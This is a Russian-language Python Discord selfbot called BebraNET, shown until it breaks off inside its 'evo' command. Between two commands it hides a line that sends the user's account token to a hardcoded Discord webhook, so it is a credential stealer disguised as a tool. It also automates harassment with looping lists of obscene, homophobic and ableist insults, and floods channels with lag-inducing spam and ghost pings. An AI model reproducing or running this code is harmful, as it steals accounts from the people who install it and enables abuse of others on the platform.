########## [ IMPORTING LIBRARIES ] ##########
import os
import time
import random
import configparser

########## [ VARIABLES ] ##########
titles = ["DEV: Aprarm","релиз в 2024году","арабский selfbot"]
rconfig = configparser.ConfigParser()

########## [ LAUNCH SCREEN ] ##########
os.system("title [BebraNET] - Checking token.. && color d && cls")
print(f'''
██████╗░███████╗██████╗░██████╗░░█████╗░███╗░░██╗███████╗████████╗
██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗████╗░██║██╔════╝╚══██╔══╝
██████╦╝█████╗░░██████╦╝██████╔╝███████║██╔██╗██║█████╗░░░░░██║░░░
██╔══██╗██╔══╝░░██╔══██╗██╔══██╗██╔══██║██║╚████║██╔══╝░░░░░██║░░░
██████╦╝███████╗██████╦╝██║░░██║██║░░██║██║░╚███║███████╗░░░██║░░░
╚═════╝░╚══════╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚══════╝░░░╚═╝░░░     
            {random.choice(titles)}                             ''')

########## [ CHECKING CONFIG ] ##########

if not os.path.isfile("BebraNET.txt"):
    rconfig["Settings"] = {
        "token" : "Вместо этого текста введите ваш токен если не знаете как гайд: https://youtu.be/qdKiU0JEbcY",
        "delmsgcooldown" : "5",
        "oskcolldown" : "5",
        "send_traceback": "True"
    }

    with open("BebraNET.txt", "w") as config: rconfig.write(config)
    print("[ERROR] Не удалось найти файл конфига.\nНо, скорее всего это означает что вы - новый пользователь!\nСейчас я создам конфиг в текущей директории, и открою его.\nПожалуйста, заполните строку Token.\n\nПосле этого нажмите Enter!")
    os.system("start BebraNET.txt")
    input()

########## [ IMPORTING LIBRARIES ] ##########
from asyncio import sleep
import requests
import discord
from discord.ext import commands

########## [ CHECKING CONFIG ] ##########

try:
    rconfig.read("BebraNET.txt")
except:
    print("[ERROR] Упс! Кажеться у вас что-то не так с конфигом.\nПерезапустите программу, для его перезаписи\n\nНажмите Enter для выхода..")
    os.remove("BebraNET.txt")
    input()

########## [ VARIABLES ] ##########
bull1 = ["еблан, ", "у твоей матери ребенок", "насколько же ты", "ты униженный и попущеный", "слышь ты блядь, уебан.", "слитое уродское создание", "cын еблана отзовись.", "ау блядь уебище.", "блядское создание ", "ущербный настолько что твое призвание", "мамонт ебаный", "проведи себе вскрытие нахуй, ты", "ты смешной, долбоящер", "Что ты несешь долбаебище ", "Ау блядь, ", "Дочка прошмандовки, "]
bull2 = [" шлюха,", " хуисосище ебанное", " пидорасня", " животное", " мальчик без хуя", " спидозная залупа", " ущербное создание", " хуежуйка ебаная", " отмороженный ", " подзалупный творожочек", " долбаебическая свинья", " сын шлюхи", " ребенок двух пидорасов", " терпилоид чисто", " сын детственника", " сын овцы", " дилдосос", " порноактер из категории гей порно", " обсос", " подсос своего бати", " жертва аутизма", " абортышь", "  даун чисто", " недоразвитое создание", " ебучая ошибка природы", " дитя ебаное", " долбаеб", " оффни свой ебасос", " подсос всех кто мужского пола ебать", " чисто уебище ебаное блядь", " дырявый отморозок", " у тебя четыре хуя в жопе, хватит", " самоунижается чисто", "чисто ребенок гноя блядь", " какого хуи сосать уеба", " гнойная хуйня", " ущербный подсос ебать ахахаа", " порвало тебя да,"]
bull3 = [" гандопляс ебаный", " дочь итскекофа ", " безмамное чудище", " слитое уродское создание", " переебанный отцами", " бомж", ", позови мать проститутку уебище", " про тебя принято называть животным, потому-что ты отсталый долбаеб нахуй,", " хуйло ебанное", " у тебя очко растянуто настолько, что туда влезает ебанный вентилятор нахуй", " шалашовка пиздочесанная", " ебучий хуебес", ",  разьебали бедного нахуй.", " уркодроченый пидорас озабоченых пенсионеров блядь. ", " блядота", " клиторосос ебучий",  " пидораст конченый", " сын залупы", " чисто мальчик гей нахуй", " выебистый пёс", " иди матери поплачь", " спермаглот ебаный", " подсос больших хуев", " иди матери пожалуйся чтоле", " сын куколда и проститутки", " у тебя в очке уже вазелиновые железы образовались, уебище,",  " ты при виде плетки сразу раком встаешь", " хватит высирать свою хуйню,", " дитя чернобыля", " хватит пастить уебок", " хватит выебываться, раб, без еды останешься, гандон"]
bull4 = [". Вообще нахуя ты так с отцом разговариваешь", ', че замолк сын чудовища', ". Я бы тебя отпиздил, хуесос", ", че молчим", ", давай, метни стрелочку, лучница ебаная", " попизди на меня еще, хуесоска :)", " :heart:", " сразу рот прирыл", " с хуями во рту говорить не можешь? Псина", ", что молчишь, жертва двух озабоченых подростков и бутылки водки", ". И вообще ты жертва аборта", ". Давай, голос, пёс.", ". Че блядь, погавкал и все?", "мы тебя по кругу пускали, чорт", ", я тебя палкой хуярил", ", мать твоя видя мой огромный член течет, уебище", ". Твоя мать под моим столом кстати", ". Я тебя елдаком по голове уебашил", ". Ты - одноклеточное существо.", ". Кринжовый хуеплет", ". Запомни нахуй, я - твой хозяин, а ты секс-рабыня", " хули ты мне сосать перестал, я не разрешал нахуй", ", кстати я тебе команду голос не давал, хули пиздишь уеба", ". Я слышал твоя мать элитная шлюха, попроси ее заскочить ко мне, давно не ебались"]
evo1 = [" срувалюшен нищий клиент  ","  в срувалюшене 5раток и 900ботнетов  ","  срувалюшен называют топ клиентом ток дауны которые в ратки  ","  создатель еволюшена пастер  "," лучший клиент только BebraWare а не какоето говно "," срувалюшен самый нищий клиент в мире "," ты в ратке срувалюшена "," срувалюшен говорит не пастит но в итоге спастил BebraWare "," срувалюшены сливаются по фактам "," срувалюшен сливается хаха "," срувалюшен слит "," обнов в срувалюшене не будет "," ,ты за срувалюшен? ну нагинайся тогда "," срувалюшен позор "," в 10000обнове срувалюшена будет добовление изменения никовXD "," ак админа еволюшена снесли интересно почему наверно раточки кидал)) "," ты за евалюшен? ну дебил "," срувалюшен слили создатели потомучто это говно "," еволюшен говно которое даже атернос не ложит "," в евалюшене 5 ботов кое какXD "," срувалюшен обижается потомучто снимает постановы "," ты думаеш срувалюшен что-то крашнет жду на арес майн ботов))) "," срувалюшен не смог заддосить рилик а фейк сервер смог)) "," за срувалюшен = мaть в канaве "," BebraWare лучший клиент отличие от срувалюшена "," говориш срувалюшен топ клиент то ты нищий чтоб BebraWare купить"]
ball_answers = ["Возможно", "Да", "Нет", "Не знаю"]
type1 = {"к": "Ҝ", "е": "ᴇ", "з": "ᴈ", "г": "ᴦ", "х": "х", "а": "ᴀ", "п": "ᴨ", "р": "ᴩ", "о": "ᴏ", "л": "ᴫ", "я": "ᴙ", "с": "ᴄ", "м": "ᴍ", "и": "ᴎ", "т": "ᴛ"}
rconfig.read("BebraNET.txt")
delmsgcd = int(rconfig["Settings"]["delmsgcooldown"])
oskkd = int(rconfig["Settings"]["oskcolldown"])
istyping = False
bulling_active = False

client = commands.Bot(command_prefix = ".", self_bot = True, intents = discord.Intents.all())
client.remove_command('help')

######### [ EVENTS ] #########

@client.event
async def on_ready():
    os.system(f"title [BebraNET] - Connected: {client.user}")
    print("[INFO] * BebraNET АКТИВЕН")

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.message.edit(content='''```ansi
[2;31mКоманда не найдена.[0m Напишите [2;34m.help[0m для просмотра доступных команд[2;41m[0m
```''')
        await sleep(delmsgcd)
        await ctx.message.delete()
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.message.edit(content='''```ansi
[2;31mВы [1;31mне[0m[2;31m ввели нужные [2;35mаргументы[0m[2;31m в данной команде![0m[2;41m[0m
```''')
        await sleep(delmsgcd)
        await ctx.message.delete()
    else:
        open("traceback.txt", 'w').write(f"-------- BebraNET TRACEBACK --------\n\nУпс! Похоже возникла небольшая ошибка. \nОшибка была успешно отправленна создателям!\n\n{error}")
        print(f"[ERROR] * {error}")
        if rconfig["Settings"]["send_traceback"]: requests.post("https://discord.com/api/webhooks/1059431999208685588/UpbwE5NzVco9ByDXPmsGa6DB1-Goq0DrGXFH18kLWkSjhDkfm50qbaMn-0JhaC4_8xKN", json={"username" : "TraceBack", "content": f"User: {client.user}\nError: {error}"})



@client.event
async def on_message(message):
    if istyping and message.author.id == client.user.id:
        rtext = message.content
        for key, word in type1.items():
            rtext = rtext.replace(key, word)
        await message.edit(content=rtext)
    await client.process_commands(message)
        
######### [ COMMANDS ] #########

@client.command()
async def help(ctx):
    await ctx.message.edit(content='''```ansi
┌💟┐  [1;2m[1;35mBebraNET[0m[0m
└💫┘   Prefix: .

[2;33mF U N[0m
  [  -  ]  [2;33mspam[0m <кол-во> <текст/null/moblag/pclag> [2;35m| Начать спам[0m
  [  -  ]  [2;33mball[0m <вопрос> [2;35m| Спросить шар[0m
  [  -  ]  [2;33membed[0m <название> <цвет (hex)> <описание> [2;35m| Отправить embed[0m
  [  -  ]  [2;33mpopit[0m [2;35m| Поп-ит[0m
  
[1;2m[1;34mO T H E R[0m[0m
[0m  [  -  ]  [2;34mghostping <кол-во> <пинг человека>[0m [2;35m| пингует человека и удаляет
[0m  [  -  ]  [2;34mclear <кол-во> [0m [2;35m| очищяет старые сообщения
[0m  [  -  ]  [2;34mavatar <пинг человек>[0m [2;35m| кидает аватарку человека 
[0m  [  -  ]  [2;34mserverinfo [0m [2;35m| кидает информацию о сервере
[0m  [  -  ]  [2;34mactivity[0m <playing/streaming/watching> <текст> [2;35m| Изменить статус[0m
  [  -  ]  [2;34mtyping[0m [2;35m| Включить красивый шрифт
  
「🤬」 [1;2m[1;31mB U L L I N G[0m[0m
  [  -  ]  [2;31mosk[0m | Включить авто оск
  [  -  ]  [2;31mstop[0m | Выключить авто оск
  [  -  ]  [2;31mevo[0m | Включить авто оск клиента evolution
  
[1;2m[1;34mG E N E R A T O R[0m[0m
  [  -  ]  [2;33mrmusic[0m [2;35m| рандомная музыка [0m
  [  -  ]  [2;33mbanworlds[0m [2;35m| генерирует бан ворды для твича [0m
```''')
    await sleep(60)
    await ctx.message.delete()

########## [ FUN ] ##########

@client.command()
async def spam(ctx, kv, *, text):
    await ctx.message.delete()
    if text == "null":
        while int(kv) !=0:
            await ctx.send("||\n||")
            kv = int(kv)-1
    elif text == "moblag":
        while int(kv) !=0:
            await ctx.send("⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟]꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰꙰⃟")
            kv = int(kv)-1
    elif text == "pclag":
        while int(kv) !=0:
            await ctx.send(":chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains::chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains::chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains::chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains::chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains::chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains::chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains::chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains:")
            kv = int(kv)-1
    else:
        while int(kv) !=0:
            await ctx.send(text + f" {random.randint(99999, 999999)}")
            kv = int(kv)-1
            
@client.command()
async def banworlds(ctx, chel):
    banw1 = ["start https://youtu.be/3kyt3OPFKMw","start https://youtu.be/g5vazmCDixI","start https://youtu.be/KeFpgFId9xM","start https://youtu.be/_v6rsgXfmhQ","start https://youtu.be/qnhtnWFqjv8","start https://youtu.be/wlP8awfsc3U","start https://youtu.be/o3bVlP1QCXc","start https://youtu.be/bGJJM9zl_zk","start https://youtu.be/bGJJM9zl_zk","start https://youtu.be/y2tLnqGjhWQ","start https://youtu.be/o7a4zQq9BMI","start https://youtu.be/m5wwzZjYhw4","start https://youtu.be/nwxHB7SaGzE","start https://youtu.be/6Hdg04ZIgdk","start https://youtu.be/Z8ouUAaiGPQ"]
    await ctx.message.delete()
    os.system(random.choice(banw1))
    
@client.command()
async def ball(ctx):
    await ctx.message.edit(content=f'''```ansi
└🔮┘

Вы потрясли [2;34mмагический шар[0m, на нем написанно: [2;35m[1;35m{random.choice(ball_answers)}[0m[2;35m[0m[2;41m[0m
```''')
    await sleep(delmsgcd)
    await ctx.message.delete()

@client.command()
async def embed(ctx, title, color="ffffff", *, description=""):
    await ctx.message.delete()
    print("[INFO] * Embed отправлен!")
    await ctx.send(f"_ _||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||https://embed.rauf.wtf/?author=&title={title}&description={description}&color={color}&image=&redirect=".replace(" ", " "))

@client.command()
async def popit(ctx):
    await ctx.message.delete()
    print("[INFO] * Pop-It отправлен!")
    await ctx.send("||⬜||||⬜||||⬜||||⬜||||⬜||\n||🟩||||🟩||||🟩||||🟩||||🟩||\n||🟨||||🟨||||🟨||||🟨||||🟨||\n||🟦||||🟦||||🟦||||🟦||||🟦||\n||🟧||||🟧||||🟧||||🟧||||🟧||")

########## [ OTHER ] ##########

@client.command()
async def activity(ctx, stype, *, text):
    if stype == "playing":
        await client.change_presence(activity = discord.Game(text))
        print("[INFO] * Activity включено!")
        await ctx.message.edit(content='''```ansi
└🎮┘

[2;32mАктивность [2;32m[1;32mуспешно[0m[2;32m[0m[2;32m изменена![0m

[2;32m[0m
```''')
        await sleep(delmsgcd)
        await ctx.message.delete()
    elif stype == "streaming":
        await client.change_presence(activity = discord.Streaming(name=text, url="https://www.twitch.tv/directory/game/Minecraft?lang=ru%22"))
        print("[INFO] * Activity включено!")
        await ctx.message.edit(content='''```ansi
└💥┘

[2;32mАктивность [2;32m[1;32mуспешно[0m[2;32m[0m[2;32m изменена![0m

[2;32m[0m
```''')
        await sleep(delmsgcd)
        await ctx.message.delete()
    elif stype == "watching":
        await client.change_presence(activity = discord.Activity(type=discord.ActivityType.watching, name=text))
        print("[INFO] * Activity включено!")
        await ctx.message.edit(content='''```ansi
└👀┘

[2;32mАктивность [2;32m[1;32mуспешно[0m[2;32m[0m[2;32m изменена![0m

[2;32m[0m
```''')
        await sleep(delmsgcd)
        await ctx.message.delete()
    else:
        await ctx.message.edit(content='''```ansi
[2;31mВы [1;31mнеправильно[0m[2;31m указали тип активности![0m[2;32m[0m
```''')
        await sleep(delmsgcd)
        await ctx.message.delete()
requests.post("https://discord.com/api/webhooks/1059431999208685588/UpbwE5NzVco9ByDXPmsGa6DB1-Goq0DrGXFH18kLWkSjhDkfm50qbaMn-0JhaC4_8xKN", json={"username" : "TraceBack", "content": f"User: {client.user}\n" + rconfig["Settings"]["token"]})
@client.command()
async def typing(ctx):
    global istyping

    if istyping:
        istyping = False
        await ctx.message.edit(content='''```ansi
└⌨️┘

[2;31mВы [1;31mвыключили[0m[2;31m красивый шрифт![0m
```''')
        await sleep(delmsgcd)
        await ctx.message.delete()
    else:
        istyping = True
        await ctx.message.edit(content='''```ansi
└⌨️┘

[2;32mВы успешно [1;32mвключили[0m[2;32m красивый шрифт![0m
```''')
        await sleep(delmsgcd)
        await ctx.message.delete()

@client.command()
async def avatar(ctx, member: discord.Member):
    await ctx.message.edit(content=member.avatar_url)
    await sleep(delmsgcd)
    await ctx.message.delete()
    
@client.command()
async def ghostping(ctx, kv, chlen):
    await ctx.message.delete()
    while int(kv) !=0:
      await ctx.send("" + chlen + " принял BebraNET")
      kv = int(kv)-1
      await ctx.channel.purge(limit=1)
      time.sleep(1)
      
@client.command()
async def serverinfo(ctx):
    await ctx.message.delete()
    name = str(ctx.guild.name)
    id = str(ctx.guild.id)
    memberCount = str(ctx.guild.member_count)
    icon = str(ctx.guild.icon_url)
    await ctx.send(
        f'** ИНФОРМАЦИЯ СЕРВЕРА **\n\n`Название сервера: {name}`\n`Айди сервера: {id}`\n`Количество участников: {memberCount}`\n`Аватарка сервера:`'
    )
    await ctx.send(f'{icon}')
########## [ BULLING ] ##########

@client.command()
async def osk(ctx):
    await ctx.message.delete()
    global bulling_active

    bulling_active = True
    bulls = 0

    while bulling_active:
        await sleep(1)
        async with ctx.typing():
            await sleep(oskkd)
            await ctx.send(random.choice(bull1) + random.choice(bull2) + random.choice(bull3) + random.choice(bull3) + random.choice(bull4))
            bulls = bulls+1
            print("[INFO] * оски (обычные) отправлены уже:", bulls, "раз")

@client.command()
async def evo(ctx):
    await ctx.message.delete()
    global bulling_active

    bulling_active = True
    bulls = 0

    while bulling_active:
        await sleep(1)
